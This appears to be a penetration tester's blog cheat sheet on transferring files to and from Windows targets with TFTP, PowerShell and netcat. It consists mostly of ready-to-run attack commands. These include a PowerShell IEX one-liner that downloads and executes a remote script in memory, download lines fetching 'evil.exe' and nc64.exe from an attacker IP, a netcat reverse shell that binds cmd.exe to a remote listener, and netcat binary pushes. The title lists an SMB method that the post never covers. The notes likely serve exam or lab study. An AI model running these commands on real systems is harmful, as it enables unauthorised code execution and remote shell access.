---
layout: post
title:  "file transfer - windows - powershell / impacket-smbserver / tftp"
date:   2022-01-01
categories: web
---


# tftp

### Uploading Files with TFTP

- setup server

```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

- target

```bash
tftp -i 10.10.10.10 put file.docx
```


# Powershell

## Download Files

- directly fro memory

```bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

- oneliner

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

```bash

powershell.exe Invoke-WebRequest -Uri "http://<my ip>:81/netcat/nc64.exe" -OutFile "C:\xampp\htdocs\nc.exe"

```

## Reverse Shell


```bash

cmd.exe /c C:\xampp\htdocs\nc.exe -e cmd.exe <my ip> 4444

```

# Netcat

## windows redirect any outpur

```bash
nc -nlvp 4444 > incoming.exe
```

## kali push wget to windows

```bash
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```


